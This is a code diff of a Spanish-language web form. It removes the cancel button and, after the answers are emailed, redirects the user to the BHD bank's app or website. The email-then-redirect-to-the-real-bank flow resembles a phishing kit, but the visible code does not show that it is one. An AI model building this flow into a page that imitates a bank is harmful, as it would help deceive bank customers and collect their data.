@@ -119,7 +119,6 @@
 
         <div class="buttons">
             <button type="submit">Enviar</button>
-            <button type="button" onclick="window.location.reload()">Cancelar</button>
         </div>
     </form>
 </div>
@@ -156,6 +155,8 @@
         .then(data => {
             if (data.message === 'Correo enviado con éxito') {
                 alert('Las respuestas fueron enviadas correctamente.');
+                // Redirigir según el dispositivo
+                redirectUser();
             } else {
                 alert('Hubo un error al enviar las respuestas.');
             }
@@ -165,6 +166,17 @@
             alert('Hubo un error al enviar las respuestas.');
         });
     });
+
+    function redirectUser() {
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        if (isMobile) {
+            // Redirigir a la app BHD (Asegúrate de usar el enlace correcto)
+            window.location.href = 'bhd://app';
+        } else {
+            // Redirigir a la página web para PC
+            window.location.href = 'https://bhd.com.do/homepage-personal';
+        }
+    }
 </script>
 </body>
 </html>
